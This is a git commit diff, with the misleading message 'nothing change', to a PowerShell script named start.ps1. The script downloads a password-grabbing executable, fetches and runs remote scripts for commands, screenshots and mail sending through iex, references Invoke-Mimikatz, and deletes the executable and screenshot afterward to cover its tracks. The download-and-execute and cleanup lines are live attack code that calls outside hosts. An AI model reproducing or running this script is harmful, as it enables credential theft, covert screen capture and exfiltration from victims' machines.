b395b24e427978da021bb40d9cf6b601b11ce9c8
pc gou <pc gou>
2016-05-19 15:35:20 +0800

    nothing change

--- start.ps1
+++ start.ps1
@@ -3,15 +3,13 @@ $command = "https://raw.githubusercontent.com/gpengc/powershell/master/command.b
 $mimikatz = "https://raw.githubusercontent.com/gpengc/powershell2/master/Invoke-Mimikatz.ps1"
 $screenshot = "https://raw.githubusercontent.com/gpengc/powershell2/master/Take-ScreenShot.ps1"
 $sendmail = "https://raw.githubusercontent.com/gpengc/powershell2/master/send-mail.ps1"
-try{
+
 (new-object net.webclient).downloadfile($getpass,"e:\getpass.exe")
 iex((new-object net.webclient).downloadstring($command))
 #(new-object net.webclient).downloadstring($mimikatz) > e:\mimikatz.ps1
 iex((new-object net.webclient).downloadstring($screenshot))
 iex((new-object net.webclient).downloadstring($sendmail))
-}
-finally{
+#sleep -s 5
 rm e:\getpass.*
 rm e:\screen.png
 
-}
